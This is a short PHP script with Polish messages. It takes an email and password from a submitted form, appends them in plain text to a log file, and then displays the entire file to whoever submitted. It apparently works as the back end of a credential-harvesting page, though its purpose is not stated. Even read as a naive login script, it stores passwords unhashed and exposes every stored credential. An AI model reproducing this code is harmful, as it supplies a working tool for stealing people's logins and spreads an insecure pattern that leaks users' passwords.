<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : '';
    $password = isset($_POST["password"]) ? $_POST["password"] : '';

    $data = "Email: $email, Hasło: $password\n";
    file_put_contents("logi.txt", $data, FILE_APPEND);
    
    echo "Dane zostały zapisane!";

    echo "<pre>" . file_get_contents("logi.txt") . "</pre>";
}
?>

